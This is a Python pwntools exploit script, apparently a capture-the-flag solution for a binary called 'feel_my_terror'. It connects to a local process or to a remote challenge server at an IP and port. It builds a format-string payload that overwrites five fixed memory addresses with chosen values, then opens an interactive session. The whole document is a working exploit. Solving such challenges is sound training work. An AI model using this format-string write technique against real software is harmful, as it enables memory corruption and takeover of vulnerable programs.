#!/usr/bin/env python3

from pwn import *

exe = ELF("./feel_my_terror")

context.binary = exe



def conn():
    if args.REMOTE:
        r = remote("154.57.164.75", 32737)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)

    return r



arg1 = 0x40402C
arg2 = 0x404034
arg3 = 0x40403C
arg4 = 0x404044
arg5 = 0x40404C

idx = 6
def main():
    r = conn()

    # good luck pwning :)
    writes = {
        arg1: p64(0xDEADBEEF),
        arg2: p64(0x1337C0DE),
        arg3: p64(0xF337BABE),
        arg4: p64(0x1337F337),
        arg5: p64(0xFADEEEED),
    }
    payload = fmtstr_payload(idx, writes, write_size='short')
    r.sendlineafter(b'> ',payload)

    
    r.interactive()

if __name__ == "__main__":
    main()
